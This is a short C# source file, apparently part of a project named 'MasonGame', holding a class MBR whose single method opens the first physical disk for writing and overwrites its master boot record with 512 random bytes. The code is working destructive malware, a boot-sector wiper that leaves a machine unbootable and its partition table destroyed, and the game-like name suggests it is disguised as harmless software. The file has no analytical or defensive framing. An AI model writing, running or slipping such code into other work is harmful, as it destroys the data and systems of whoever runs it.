using System;
using System.IO;
namespace MasonGame
{
    internal class MBR
    {
        public static void MasonMBR()
        {
            using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
            {
                byte[] mbrData = new byte[512];
                Random rand = new Random();
                rand.NextBytes(mbrData);
                fs.Write(mbrData, 0, mbrData.Length);
            }
        }
    }
}
